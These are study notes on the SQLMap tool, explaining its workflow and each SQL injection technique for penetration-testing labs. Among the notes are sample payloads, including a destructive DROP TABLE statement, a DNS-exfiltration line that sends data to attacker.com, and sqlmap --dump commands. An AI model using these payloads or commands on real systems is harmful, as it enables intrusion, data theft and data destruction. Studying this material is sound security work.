![Image](https://images.openai.com/static-rsc-4/hG19hjeuNmimeKVMeCMnog_Sy5OzL9BNjzw_0r9KI6D5j4xCtlwYoYd9AQ-cMHfdFitgsSdzR5MI6XnvsDmph1jEPngMxwAgM-ZX-OeNSFswljKDlZC1ZO70zsDhk3Je1H-2h1znB5KtaQZfhbOk_VtciVDFVxLzqKf76gCnVLIN4x3-HdUbnqC9A3TX9Knl?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/QpYqvFcvv4-0sUcJhd44a-yCkquoo9BUrtPQtiS4woLXKE-bGxO0PpwBMfgB6yjvA6c4ZtnmsUKZJ5DFOk40G7kk1ylN0bmHqTuGb9atH_cO_YDMrX0cJHU4cRzhEuLduzBJ5SXBIDMdVTtU8ngUUBTYThE5KRoaz8-qd47RhJ6wRUCekWxnb4slR6VPvCBw?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/46QNCGeRO1-1puHhw_G-JCLyjg-AVilXZ3N4b6bKof6M-lJ-kAwseAJHZ4ojr_cSzVt70sPvfBjUijD6afh_XYzO10hhOfdWSeFzEzcq8pbBJaN_raSO3K40fveI2pU3SQWwUKNn2GwWL9pwuqO_zaoH90m-PzTUBIlYGEyMmEiAONzz5uChtqoXaF_G1UKB?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/qWII1F41FT7-P0FLe8hYCxuySHYUnWyv9OBr5QlByvVWGfmdSJ4baJMI-BbZ6NQXj1xdysaGWiiOscH2XolG_itkwyWzaEHUpgMYtwAxE4Oq6CywpejqrDfILGuVDpQfecbbrapGfL1T6EoXQv6AOA5ty55aFBezzXRb3LOcUBN6bpxxK0WWsC_k_R0QOFAn?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/8W7YbFwCUMcGtMj2u2e4snyCpQW0kee5HIZM6RO4Q5GkrmDdTQ4XFQ8yb4nRwqsDP6VAdtQg03E3gblFMm6qmgVHGc0QtlIKqVcQbnbCQ96i2NU013RDNOOZK3kcBdBz9OW1DcMW5iJTSrKQcz19FxGioX1tzDKRImIYbh4Vkl2ZcHROpqITafgLao8MmJRZ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ZqpZTJhoYIzwEcKm6G6PRsRc-9UYfhQ8BUnPOCFq4OPsu0ss4e5XhUU0PnQokmN-dyHA8YYjcnjaxVwmXUUCUgCr7KGWQiYqVCysjNFq3OpUAr_qCHkoHZ1_PSRg6vr4uDdFUXczjOdbkLYAkimaQ8HePUIt4OserNDWvbrBEVFuH0t6n8HOgkh7x2QCF0BM?purpose=fullsize)

# SQLMap — Detailed Notes

# SQLMap — Detailed Study Notes

> **Purpose:** These notes cover SQLMap, its installation, supported DBMSes, SQL injection techniques, how each technique works, when each technique is useful, and important SQLMap concepts for penetration-testing labs.

---

## 1. What is SQLMap?

**SQLMap** is a free and open-source penetration-testing tool written in Python that automates the process of:

- Detecting SQL Injection vulnerabilities
    
- Identifying the underlying DBMS
    
- Fingerprinting the database
    
- Testing different SQL injection techniques
    
- Enumerating databases, tables, columns, and data
    
- Retrieving database contents
    
- Performing advanced database interaction
    
- Accessing the underlying file system in supported situations
    
- Potentially executing operating-system commands when the DBMS, application configuration, and privileges allow it
    

SQLMap has been continuously developed since **2006** and remains actively maintained.

Official project:

[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

---

# 2. Basic SQLMap Usage

A basic SQLMap scan can be performed against a URL containing a parameter:

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

A typical SQLMap run performs several stages.

### Example output

```text
[*] starting at 12:55:56

[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] confirming that GET parameter 'id' is dynamic
[INFO] GET parameter 'id' is dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
(possible DBMS: 'MySQL')
[INFO] testing for SQL injection on GET parameter 'id'
```

### What SQLMap is doing here

The important stages are:

1. **Connection test**
    
    - Determines whether the target can be reached.
        
2. **WAF/IPS/IDS checks**
    
    - SQLMap attempts to identify whether traffic appears to be filtered or protected.
        
3. **Content stability test**
    
    - SQLMap wants to know whether normal responses are reasonably consistent.
        
    - This is particularly important for blind SQL injection.
        
4. **Parameter dynamicity**
    
    - SQLMap checks whether changing the parameter actually changes the application's response.
        
5. **Heuristic testing**
    
    - SQLMap performs preliminary checks to determine whether the parameter might be injectable.
        
6. **DBMS fingerprinting**
    
    - SQLMap attempts to determine the underlying database technology.
        
7. **Technique testing**
    
    - SQLMap proceeds to test applicable SQL injection techniques.
        

---

# 3. SQLMap Feature Categories

SQLMap contains functionality covering several major areas:

|Category|Purpose|
|---|---|
|Target connection|Controls how SQLMap communicates with the target|
|Injection detection|Detects whether parameters are injectable|
|Fingerprinting|Identifies the DBMS and its characteristics|
|Enumeration|Discovers databases, tables, columns, users, etc.|
|Optimization|Improves scanning and extraction efficiency|
|Protection detection|Identifies possible WAF/IPS/IDS protection|
|Tamper scripts|Alters requests to help test certain filtering situations|
|Database content retrieval|Extracts database information|
|File system access|Reads/writes files when supported|
|OS command execution|Executes operating-system commands when conditions permit|

---

# 4. SQLMap Installation

## Pre-installed environments

SQLMap is commonly pre-installed on penetration-testing distributions and environments such as Pwnbox.

## Debian-based Linux

```bash
sudo apt install sqlmap
```

## Manual installation

SQLMap can also be cloned from its Git repository:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Then:

```bash
cd sqlmap-dev
python sqlmap.py
```

Depending on the installation/environment, SQLMap may also be available directly as:

```bash
sqlmap
```

---

# 5. Supported DBMSes

SQLMap supports a large number of database management systems.

Important supported DBMSes include:

- MySQL
    
- Oracle
    
- PostgreSQL
    
- Microsoft SQL Server
    
- SQLite
    
- IBM DB2
    
- Microsoft Access
    
- Firebird
    
- Sybase
    
- SAP MaxDB
    
- Informix
    
- MariaDB
    
- HSQLDB
    
- CockroachDB
    
- TiDB
    
- MemSQL
    
- H2
    
- MonetDB
    
- Apache Derby
    
- Amazon Redshift
    
- Vertica
    
- Mckoi
    
- Presto
    
- Altibase
    
- MimerSQL
    
- CrateDB
    
- Greenplum
    
- Drizzle
    
- Apache Ignite
    
- Cubrid
    
- InterSystems Cache
    
- IRIS
    
- eXtremeDB
    
- FrontBase
    

SQLMap's DBMS support is periodically expanded and maintained.

---

# 6. SQL Injection Techniques Supported by SQLMap

The SQLMap help menu can be used to view its injection-related options:

```bash
sqlmap -hh
```

The technique option is:

```text
--technique=TECH..
```

The default technique set is:

```text
BEUSTQ
```

## Meaning of BEUSTQ

|Character|Technique|
|---|---|
|**B**|Boolean-based blind|
|**E**|Error-based|
|**U**|UNION query-based|
|**S**|Stacked queries|
|**T**|Time-based blind|
|**Q**|Inline queries|

### Memory trick

**B E U S T Q**

- **B** = Boolean
    
- **E** = Error
    
- **U** = UNION
    
- **S** = Stacked
    
- **T** = Time
    
- **Q** = Query / Inline
    

---

# 7. High-Level Classification of SQL Injection

SQL injection techniques can be understood using three broad categories:

```text
SQL Injection
│
├── In-Band / Classic
│   ├── Error-Based
│   └── UNION-Based
│
├── Inferential / Blind
│   ├── Boolean-Based Blind
│   └── Time-Based Blind
│
└── Out-of-Band
    └── DNS / Other External Channel
```

The major difference is **how the result of the injected query reaches the tester**.

### In-band

The result comes back through the normal HTTP/application response.

### Blind

The result is not directly displayed. Information must be inferred from:

- Response differences
    
- Boolean conditions
    
- Response timing
    

### Out-of-band

The database/application sends information through another communication channel, such as DNS or HTTP.

---

# 8. Boolean-Based Blind SQL Injection

## Definition

**Boolean-based blind SQL injection** is a blind SQLi technique where the tester determines information by observing whether a condition evaluates to:

```text
TRUE
```

or:

```text
FALSE
```

Example:

```sql
AND 1=1
```

The important concept is not the particular expression itself.

The key idea is:

```text
Condition TRUE
       ↓
Application response A

Condition FALSE
       ↓
Application response B
```

SQLMap compares responses to determine whether the injected condition was true or false.

---

## How SQLMap detects Boolean differences

The difference may be based on:

- Response body
    
- HTTP status code
    
- Page title
    
- Presence/absence of specific content
    
- Headers
    
- Other response characteristics
    

SQLMap has a response-comparison engine that attempts to distinguish TRUE and FALSE responses. ([DeepWiki](https://deepwiki.com/sqlmapproject/sqlmap/3.4-injection-technique-types?utm_source=chatgpt.com "Injection Technique Types | sqlmapproject/sqlmap | DeepWiki"))

---

## Information extraction

A Boolean blind attack effectively obtains approximately **one binary decision per request**.

Conceptually:

```text
Is the condition TRUE?
        │
   ┌────┴────┐
   │         │
 TRUE      FALSE
   │         │
   1         0
```

By repeating these decisions, the tester can gradually reconstruct information.

SQLMap uses a **bisection/binary-search approach** for blind inference, rather than simply trying every possible character sequentially. ([DeepWiki](https://deepwiki.com/sqlmapproject/sqlmap/3.4-injection-technique-types?utm_source=chatgpt.com "Injection Technique Types | sqlmapproject/sqlmap | DeepWiki"))

### Important concept

Blind SQLi can be significantly slower than UNION-based SQLi because many HTTP requests may be required to reconstruct information.

---

## When Boolean-based SQLi is useful

It is particularly useful when:

- The application does not display database errors.
    
- Query results are not directly reflected.
    
- The application's response changes depending on query truth.
    
- Response differences are stable enough to measure.
    

---

# 9. Error-Based SQL Injection

## Definition

**Error-based SQL injection** takes advantage of database error messages that are returned to the application/user.

Example from the original material:

```sql
AND GTID_SUBSET(@@version,0)
```

The exact payload used depends on the DBMS.

---

## Basic concept

The flow is:

```text
Injected SQL
     ↓
Database processes query
     ↓
Database generates an error
     ↓
Error reaches application response
     ↓
Useful information may be exposed
```

Some DBMS-specific errors can contain information derived from the query being evaluated.

---

## Why error messages matter

A verbose database error can reveal:

- DBMS type
    
- Database version
    
- Query structure
    
- Table/column information
    
- Sometimes attacker-controlled query results
    

This makes error-based SQLi potentially much faster than blind techniques.

SQLMap's error-based technique relies on DBMS-specific behavior and parses returned responses for useful database errors. ([GitHub](https://github.com/sqlmapproject/sqlmap/wiki/Techniques/df3882c51861bef399fb4582912c4f052c352dd1?utm_source=chatgpt.com "Techniques · sqlmapproject/sqlmap Wiki · GitHub"))

---

## Supported DBMSes in the provided material

The original material lists error-based support for:

|DBMS|
|---|
|MySQL|
|PostgreSQL|
|Oracle|
|Microsoft SQL Server|
|Sybase|
|Vertica|
|IBM DB2|
|Firebird|
|MonetDB|

---

## Important limitation

Error-based SQLi requires useful database errors to be exposed to the tester.

If the application does:

```text
Database error
      ↓
Application catches it
      ↓
Generic "Something went wrong"
```

then the error-based channel becomes much less useful.

---

# 10. UNION Query-Based SQL Injection

## Definition

**UNION-based SQL injection** uses the SQL `UNION` operator to combine the results of the original query with the results of an injected query.

Example:

```sql
UNION ALL SELECT 1,@@version,3
```

---

## Basic concept

Suppose an application normally executes:

```sql
SELECT id,title,description
FROM products
WHERE id = 5;
```

A vulnerable application may allow an attacker-controlled input to alter the query.

Conceptually:

```text
Original query
      +
Injected UNION query
      ↓
Combined result
      ↓
Application response
```

If the application's response directly renders query results, the additional results may become visible.

---

## Why UNION SQLi can be fast

If the application reflects the injected query's results directly into the response, a relatively small number of requests may retrieve substantial amounts of information.

SQLMap therefore attempts to determine things such as:

- Whether UNION injection is possible
    
- Number of columns
    
- Compatible column positions
    
- Which output columns are reflected
    

SQLMap's UNION implementation specifically handles column-count/type discovery before using the technique. ([DeepWiki](https://deepwiki.com/sqlmapproject/sqlmap/3-sql-injection-techniques?utm_source=chatgpt.com "SQL Injection Techniques | sqlmapproject/sqlmap | DeepWiki"))

---

## Example

Original example:

```sql
UNION ALL SELECT 1,@@version,3
```

The idea is:

```text
Column 1 → 1
Column 2 → database version
Column 3 → 3
```

If column 2 is displayed by the application, the database version may appear in the response.

---

# 11. Stacked Queries

## Definition

**Stacked queries**, also called **piggy-backing**, involve executing multiple SQL statements sequentially.

Example:

```sql
; DROP TABLE users
```

Conceptually:

```text
Original SQL statement
        ;
Additional SQL statement
```

---

## Why stacked queries are powerful

Unlike techniques that primarily rely on `SELECT`, stacked queries can potentially allow additional statements such as:

```sql
INSERT
UPDATE
DELETE
```

depending on DBMS behavior and application/database-driver support.

SQLMap tests whether the target supports stacked queries and can use them for operations beyond ordinary data retrieval where the underlying environment permits it. ([GitHub](https://github.com/sqlmapproject/sqlmap/wiki/Techniques/df3882c51861bef399fb4582912c4f052c352dd1?utm_source=chatgpt.com "Techniques · sqlmapproject/sqlmap Wiki · GitHub"))

---

## DBMS support

The provided material specifically mentions:

- Microsoft SQL Server
    
- PostgreSQL
    

as DBMSes that support stacked queries by default.

However, actual exploitability depends on factors including:

- DBMS
    
- Database driver
    
- Application framework
    
- Query API
    
- User privileges
    
- Configuration
    

---

## Important distinction

**SQL injection vulnerability does not automatically mean stacked-query support.**

You can have:

```text
SQLi = YES
Stacked queries = NO
```

The two are separate capabilities.

---

# 12. Time-Based Blind SQL Injection

## Definition

**Time-based blind SQL injection** determines whether a condition is true or false by measuring how long the server takes to respond.

Example:

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

The idea is:

```text
Condition TRUE
      ↓
Database waits
      ↓
Noticeable delay

Condition FALSE
      ↓
No intentional delay
      ↓
Normal response time
```

---

## Example concept

Suppose a condition is:

```text
Is X true?
```

The application can be made to behave conceptually like:

```text
IF X is TRUE
    wait 5 seconds
ELSE
    respond normally
```

The tester observes the response.

```text
Normal response: ~0.3 seconds

Delayed response: ~5.3 seconds

                         ↓

                 Condition likely TRUE
```

SQLMap compares response timing against a baseline when performing time-based inference. ([DeepWiki](https://deepwiki.com/sqlmapproject/sqlmap/3.4-injection-technique-types?utm_source=chatgpt.com "Injection Technique Types | sqlmapproject/sqlmap | DeepWiki"))

---

# 13. Why Time-Based SQLi Is Slow

Time-based SQLi is generally slower because successful conditions intentionally delay the server.

For example:

```text
Request 1 → 0.3 sec
Request 2 → 5.2 sec
Request 3 → 0.4 sec
Request 4 → 5.1 sec
...
```

If thousands of requests are necessary, the accumulated delay can become significant.

---

## Problems with timing attacks

Network conditions can introduce:

- Latency
    
- Jitter
    
- Server load
    
- Connection delays
    
- Proxy delays
    
- WAF processing delays
    

Therefore:

```text
Slow response ≠ automatically SQL injection
```

A good tester needs a stable baseline and repeated observations.

---

## When Time-Based Blind SQLi is useful

It becomes especially useful when:

- No query output is displayed.
    
- Database errors are hidden.
    
- Boolean differences are unavailable or unreliable.
    
- The application still allows the injected query to influence execution.
    

---

# 14. Inline Queries

## Definition

**Inline SQL injection** embeds a query inside another SQL query.

Example:

```sql
SELECT (SELECT @@version) from
```

The inner query is executed as part of the surrounding query.

Conceptually:

```text
Outer Query
    │
    └── Inner Query
           │
           └── Database information
```

---

## Why inline SQLi is uncommon

The application's SQL statement must be structured in a way that allows the injected query to be embedded successfully.

Therefore, this technique is more dependent on the exact query structure.

SQLMap includes inline-query support as the `Q` technique in its technique set. ([DeepWiki](https://deepwiki.com/sqlmapproject/sqlmap/3-sql-injection-techniques?utm_source=chatgpt.com "SQL Injection Techniques | sqlmapproject/sqlmap | DeepWiki"))

---

# 15. Out-of-Band SQL Injection

## Definition

**Out-of-band (OOB) SQL injection** is an advanced SQLi technique where the result is obtained through a communication channel separate from the original HTTP response.

Possible channels include:

- DNS
    
- HTTP
    
- Other supported external communication mechanisms
    

---

## Basic concept

Normal SQLi:

```text
Tester
   ↓
Web Application
   ↓
Database
   ↓
Web Application
   ↓
Tester
```

OOB SQLi:

```text
Tester
   ↓
Web Application
   ↓
Database
   │
   └──────────→ External server
                    ↓
                 Result
```

The second channel is what makes it **out-of-band**.

---

# 16. DNS Exfiltration

The provided example is:

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

The underlying idea is that the database/server is induced to make an external request containing information in a hostname or other request component.

Conceptually:

```text
Database
   │
   │ DNS request
   ▼
version.attacker.com
   │
   ▼
Tester-controlled DNS server
```

The tester can observe the DNS request and reconstruct the encoded information.

---

## Example concept

Suppose the database returns:

```text
8.0.36
```

The external request might conceptually contain:

```text
8-0-36.attacker.com
```

The tester-controlled DNS infrastructure observes:

```text
8-0-36.attacker.com
```

and reconstructs the value.

---

# 17. Why OOB SQLi Is Useful

Out-of-band SQLi can be valuable when:

- The HTTP response does not contain useful output.
    
- Boolean-based extraction is impractical.
    
- Time-based extraction is too slow.
    
- The database/server can make outbound requests.
    
- Appropriate DBMS functionality is available.
    

However, OOB SQLi has an important requirement:

> **The target environment must be capable of making the required outbound request.**

If outbound DNS/HTTP communication is blocked, the technique may fail.

---

# 18. SQLMap Technique Comparison

|Technique|Main Signal|Typical Speed|Requires Visible Output?|
|---|---|--:|---|
|Boolean-based|TRUE/FALSE response difference|Slow|No|
|Error-based|Database error|Fast|Error disclosure|
|UNION-based|Reflected query output|Very fast when ideal|Usually yes|
|Stacked|Additional statement execution|Depends|Not necessarily|
|Time-based|Response delay|Slow|No|
|Inline|Embedded query result|Depends|Depends|
|Out-of-band|External DNS/HTTP interaction|Varies|No|

---

# 19. The Most Important Mental Model

Do not memorize SQLi techniques as random payloads.

Instead, ask:

> **"How can I observe the result of my injected SQL?"**

There are several possible answers.

### 1. The application shows the result

Use the concept of:

```text
UNION-based
```

### 2. The database leaks the result through an error

Use:

```text
Error-based
```

### 3. The application behaves differently for TRUE/FALSE

Use:

```text
Boolean-based blind
```

### 4. The application does not visibly change, but execution time changes

Use:

```text
Time-based blind
```

### 5. The database can communicate externally

Use:

```text
Out-of-band
```

This mental model is much more useful than memorizing individual payloads.

---

# 20. SQLMap's Blind Extraction Concept

Blind extraction can be understood as a search problem.

Suppose the tester wants to determine a character.

Instead of asking:

```text
Is character A?
Is character B?
Is character C?
Is character D?
...
```

SQLMap can use a binary-search/bisection approach.

Conceptually:

```text
Possible values
       ↓
   A ───────── Z
       ↓
     Split
       ↓
A ─── M | N ─── Z
       ↓
   Determine side
       ↓
Continue splitting
       ↓
     Character
```

This significantly reduces the number of decisions needed compared with checking every possible character individually.

SQLMap's blind inference implementation uses bisection for this purpose. ([DeepWiki](https://deepwiki.com/sqlmapproject/sqlmap/3.4-injection-technique-types?utm_source=chatgpt.com "Injection Technique Types | sqlmapproject/sqlmap | DeepWiki"))

---

# 21. SQLMap's General Workflow

A useful way to remember SQLMap's workflow is:

```text
1. Target
   ↓
2. Connection
   ↓
3. Parameter analysis
   ↓
4. Stability testing
   ↓
5. Injection detection
   ↓
6. DBMS fingerprinting
   ↓
7. Technique selection
   ↓
8. Enumeration
   ↓
9. Data retrieval
   ↓
10. Advanced functionality
```

---

# 22. Target Identification

SQLMap needs to know what request should be tested.

A simple GET parameter example:

```text
http://target/page.php?id=5
```

The parameter is:

```text
id
```

SQLMap can test whether this parameter influences the backend SQL query.

Example:

```bash
sqlmap -u 'http://target/page.php?id=5'
```

---

# 23. Dynamic vs Static Parameters

One of SQLMap's early checks is whether a parameter is **dynamic**.

### Static parameter

Changing the parameter produces essentially the same response.

```text
id=1
id=2
id=3

        ↓

Same application behavior
```

### Dynamic parameter

Changing the parameter changes the application's response.

```text
id=1 → Product A
id=2 → Product B
id=3 → Product C
```

Dynamicity does not automatically prove SQL injection.

It simply indicates that the parameter affects application behavior.

---

# 24. WAF / IPS / IDS Detection

SQLMap may check whether the target appears to have protection such as:

- WAF — Web Application Firewall
    
- IPS — Intrusion Prevention System
    
- IDS — Intrusion Detection System
    

A WAF may:

```text
Request
   ↓
WAF
   ↓
Allowed / Blocked / Modified
   ↓
Application
```

This can affect SQL injection testing.

---

# 25. Tamper Scripts

SQLMap includes **tamper scripts** that modify generated requests.

Their purpose can include changing the representation of a payload so that it interacts differently with certain filtering mechanisms.

Important:

> Tamper scripts do not magically bypass every WAF.

Their effectiveness depends on:

- WAF behavior
    
- DBMS
    
- Application parsing
    
- Encoding
    
- Normalization
    
- The exact filtering rule
    

Think of them as **request-transformation mechanisms**, not universal bypasses.

---

# 26. Enumeration

Once SQLMap establishes an injectable target in an authorized lab, enumeration can involve discovering:

```text
Database
   ↓
Tables
   ↓
Columns
   ↓
Rows / Data
```

A conceptual enumeration hierarchy:

```text
DBMS
 │
 ├── Database A
 │    ├── users
 │    │    ├── id
 │    │    ├── username
 │    │    └── password
 │    │
 │    └── products
 │         ├── id
 │         ├── name
 │         └── price
 │
 └── Database B
```

---

# 27. Important SQLMap Options

## Display help

```bash
sqlmap -h
```

More detailed help:

```bash
sqlmap -hh
```

---

## Specify a URL

```bash
sqlmap -u 'http://target/page.php?id=5'
```

---

## Specify a DBMS

In situations where the DBMS is already known, SQLMap can be given the DBMS explicitly using its appropriate option.

This can reduce unnecessary detection work.

---

# 28. Important SQLMap Enumeration Concepts

The common SQLMap workflow is:

```text
Detect
  ↓
Identify DBMS
  ↓
Enumerate databases
  ↓
Enumerate tables
  ↓
Enumerate columns
  ↓
Retrieve selected data
```

Common SQLMap switches include:

```text
--dbs
--tables
--columns
--dump
```

For example, in an authorized lab, the general structure is:

```bash
sqlmap -u '<LAB_URL>' --dbs
```

Then:

```bash
sqlmap -u '<LAB_URL>' -D '<DATABASE>' --tables
```

Then:

```bash
sqlmap -u '<LAB_URL>' -D '<DATABASE>' -T '<TABLE>' --dump
```

These should only be used against systems where you have explicit authorization.

---

# 29. Important Distinction: Detection vs Exploitation

This distinction is extremely important.

## Detection

Question:

> Is this parameter vulnerable to SQL injection?

```text
Parameter
   ↓
Testing
   ↓
Potential SQLi
```

## Enumeration

Question:

> What database structure can be observed?

```text
SQLi
 ↓
DBMS
 ↓
Databases
 ↓
Tables
 ↓
Columns
```

## Data retrieval

Question:

> What data is stored there?

```text
Table
 ↓
Rows
 ↓
Values
```

## Advanced exploitation

Question:

> Can the database functionality reach files or operating-system functionality?

This is much more dependent on:

- DBMS
    
- Database privileges
    
- Operating-system privileges
    
- Application configuration
    
- File permissions
    
- Security controls
    

---

# 30. SQLMap Does Not Make SQLi "Magic"

A common beginner mistake is thinking:

```text
sqlmap
   ↓
automatic hacking
```

A better mental model is:

```text
Tester understanding
       +
Target behavior
       +
SQLMap automation
       ↓
SQLi assessment
```

SQLMap automates a huge amount of repetitive work, but understanding the underlying SQL injection technique is still essential.

---

# 31. Technique Selection — Quick Decision Tree

```text
                SQLi suspected
                      │
                      ▼
             Does output appear?
                /          \
              YES           NO
               │             │
               ▼             ▼
        UNION / Error     Can response
                          differ TRUE/FALSE?
                            /       \
                          YES        NO
                           │          │
                           ▼          ▼
                       Boolean     Can timing
                        Blind      be measured?
                                     /   \
                                   YES    NO
                                    │      │
                                    ▼      ▼
                                  Time    OOB/
                                  Blind   other
```

This is a conceptual decision tree, not a requirement that SQLMap always use techniques in this exact order.

---

# 32. Speed Comparison — General Idea

A rough conceptual ordering is:

```text
Fast
 │
 ├── UNION-based
 │
 ├── Error-based
 │
 ├── Stacked / Inline
 │
 ├── Boolean-based blind
 │
 └── Time-based blind
       │
       ▼
     Slower
```

But actual speed depends heavily on:

- Network latency
    
- Number of requests
    
- Application response size
    
- DBMS
    
- Query complexity
    
- WAF behavior
    
- Server load
    
- Stability of responses
    
- Extraction strategy
    

Therefore, do not treat the ordering as an absolute benchmark.

---

# 33. Important Terminology

## DBMS

**Database Management System**

Examples:

- MySQL
    
- PostgreSQL
    
- Microsoft SQL Server
    
- Oracle
    
- SQLite
    

---

## SQLi

Short for:

**SQL Injection**

---

## Blind SQLi

SQL injection where useful information is not directly returned and must instead be inferred.

---

## In-band

The attack and retrieved result use the same communication channel.

---

## Out-of-band

The result travels through another communication channel.

---

## Enumeration

Systematically discovering information about the target environment.

---

## Fingerprinting

Determining characteristics of the backend system, particularly the DBMS.

---

## Payload

The SQL expression/data used during an injection test.

---

## DBMS fingerprint

Information that helps determine which database technology is being used.

---

# 34. Key Differences Between SQLi Techniques

|Technique|What you observe|
|---|---|
|Boolean blind|Different application behavior|
|Error-based|Database error containing useful information|
|UNION-based|Injected query output appears in page|
|Stacked|Additional SQL statements execute|
|Time-based blind|Response takes noticeably longer|
|Inline|Embedded query influences result|
|Out-of-band|External DNS/HTTP interaction|

---

# 35. Examples From the Original Material

## Boolean-based

```sql
AND 1=1
```

---

## Error-based

```sql
AND GTID_SUBSET(@@version,0)
```

---

## UNION-based

```sql
UNION ALL SELECT 1,@@version,3
```

---

## Stacked queries

```sql
; DROP TABLE users
```

---

## Time-based blind

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

---

## Inline query

```sql
SELECT (SELECT @@version) from
```

---

## Out-of-band

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

> **Note:** These examples are technique illustrations. The exact syntax is DBMS- and query-context-dependent.

---

# 36. SQLMap Technique Letters — Memorize This

```text
B = Boolean-based blind
E = Error-based
U = UNION query-based
S = Stacked queries
T = Time-based blind
Q = Inline queries
```

### One-line revision

> **BEUSTQ = Boolean, Error, UNION, Stacked, Time, Inline.**

---

# 37. Boolean vs Time-Based Blind SQLi

|Feature|Boolean Blind|Time Blind|
|---|---|---|
|Visible data|No|No|
|Main signal|Response difference|Response delay|
|Requires stable content|Usually|Timing baseline|
|Speed|Slow|Usually slower|
|Network jitter impact|Moderate|High|
|Useful when output hidden|Yes|Yes|
|Core idea|TRUE/FALSE behavior|TRUE/FALSE timing|

### Remember:

```text
Boolean → "What changed?"

Time → "How long did it take?"
```

---

# 38. Error-Based vs UNION-Based

|Feature|Error-Based|UNION-Based|
|---|---|---|
|Signal|DB error|Page output|
|Requires error disclosure|Yes|No|
|Requires reflected query output|No|Usually|
|Speed|Fast|Often very fast|
|DBMS-specific behavior|Important|Important|
|Main advantage|Information through errors|Direct result retrieval|

### Remember:

```text
Error-based → Database tells you through an ERROR

UNION-based → Database tells you through OUTPUT
```

---

# 39. In-Band vs Blind vs OOB

### In-Band

```text
Request
  ↓
Database
  ↓
Response contains information
```

### Blind

```text
Request
  ↓
Database
  ↓
Application behavior
  ↓
Tester infers information
```

### Out-of-Band

```text
Request
  ↓
Database
  ↓
External communication
  ↓
Tester observes external channel
```

---

# 40. Important Practical Lessons

### Lesson 1 — A dynamic parameter is not automatically vulnerable

```text
Dynamic ≠ Injectable
```

It only means the parameter affects application behavior.

---

### Lesson 2 — SQLMap first needs a communication path

If the application cannot be reached or the request is incorrect, SQLMap cannot meaningfully test the parameter.

---

### Lesson 3 — Blind SQLi depends on reliable signals

For Boolean-based:

```text
TRUE response ≠ FALSE response
```

For Time-based:

```text
TRUE response time ≠ FALSE response time
```

If the responses are unstable, false positives/false negatives can occur.

---

### Lesson 4 — DBMS matters

SQL syntax differs between:

```text
MySQL
PostgreSQL
SQL Server
Oracle
SQLite
...
```

Therefore, a payload that works against one DBMS may not work against another.

---

### Lesson 5 — Privileges matter

Even if SQL injection exists, the database account may have limited privileges.

```text
SQLi
 ↓
Database access
 ↓
Limited DB privileges
```

does not automatically equal:

```text
Operating-system compromise
```

---

# 41. SQLMap and OS Command Execution

SQLMap contains advanced functionality that can potentially lead to OS command execution in certain environments.

This requires more than simply having SQL injection.

Potential prerequisites can include:

- A compatible DBMS
    
- Appropriate database privileges
    
- A vulnerable/compatible configuration
    
- File or procedure functionality
    
- Operating-system permissions
    
- Appropriate application/database-driver behavior
    

Therefore:

```text
SQL Injection
      ≠
Automatic OS Command Execution
```

This distinction is extremely important when interpreting lab results.

---

# 42. SQLMap and File System Access

SQLMap also has functionality related to file-system interaction.

Whether it works depends on:

- DBMS capabilities
    
- Database account privileges
    
- Server configuration
    
- File permissions
    
- Operating-system restrictions
    
- Application environment
    

Again:

```text
SQLi
 ↓
DB access
 ↓
File functionality
 ↓
OS permissions
```

Every step has its own requirements.

---

# 43. SQLMap Request → Response Model

A useful way to understand SQLMap is:

```text
             SQLMap
                │
                │ HTTP Request
                ▼
        ┌────────────────┐
        │ Web Application│
        └───────┬────────┘
                │
                │ SQL Query
                ▼
        ┌────────────────┐
        │     DBMS       │
        └───────┬────────┘
                │
                ▼
        Application Response
                │
                ▼
             SQLMap
                │
                ▼
        Analyze / Infer
```

Depending on the technique, the information reaches SQLMap through:

```text
Response body
     OR
Database error
     OR
Response behavior
     OR
Response timing
     OR
External communication
```

---

# 44. Complete SQLMap Mental Map

```text
                         SQLMap
                            │
          ┌─────────────────┼─────────────────┐
          │                 │                 │
       Detection        Fingerprinting    Enumeration
          │                 │                 │
          ▼                 ▼                 ▼
        SQLi?             Which DB?       What exists?
          │
          ▼
     Technique
      Selection
          │
   ┌──────┼──────┬────────┬────────┬───────┐
   │      │      │        │        │       │
   B      E      U        S        T       Q
   │      │      │        │        │       │
Boolean Error  UNION   Stacked    Time   Inline
 Blind          │                 Blind
                │
                ▼
           Direct Output
```

---

# 45. Quick Revision Sheet

## SQLMap

```text
Python-based SQL injection automation tool
```

## Basic execution

```bash
sqlmap -u '<URL>'
```

## Detailed help

```bash
sqlmap -hh
```

## Technique set

```text
BEUSTQ
```

## B

```text
Boolean-based blind
```

Observe TRUE/FALSE response differences.

## E

```text
Error-based
```

Use database error behavior to obtain information.

## U

```text
UNION-based
```

Combine query results and retrieve reflected output.

## S

```text
Stacked queries
```

Execute additional SQL statements when supported.

## T

```text
Time-based blind
```

Infer information through response delays.

## Q

```text
Inline queries
```

Embed one query inside another.

## OOB

```text
Out-of-band
```

Retrieve information through an external channel such as DNS.

---

# 46. Exam / Interview Questions

### Q1. What is SQLMap?

SQLMap is an open-source Python penetration-testing tool that automates detection and exploitation of SQL injection vulnerabilities.

### Q2. What does `BEUSTQ` mean?

```text
B → Boolean
E → Error
U → UNION
S → Stacked
T → Time
Q → Inline
```

### Q3. What is Boolean-based blind SQLi?

A technique where information is inferred by observing differences between TRUE and FALSE query conditions.

### Q4. What is Error-based SQLi?

A technique where database error messages are used as a channel for obtaining information.

### Q5. What is UNION-based SQLi?

A technique that uses SQL `UNION` functionality to combine the original query's output with an injected query's results.

